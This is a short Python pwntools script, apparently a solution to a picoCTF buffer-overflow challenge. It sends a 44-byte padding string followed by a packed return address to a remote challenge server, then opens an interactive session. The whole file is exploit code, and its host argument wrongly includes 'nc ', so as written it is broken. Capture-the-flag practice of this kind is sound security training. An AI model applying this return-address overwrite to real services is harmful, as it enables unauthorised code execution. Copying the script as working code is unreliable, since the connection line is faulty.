from pwn import *

p=remote('nc saturn.picoctf.net', 62184)

overflow='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb\xf6\x91\x04\x08'

print( p.recvuntil(':'))

p.sendline(overflow)

p.interactive()

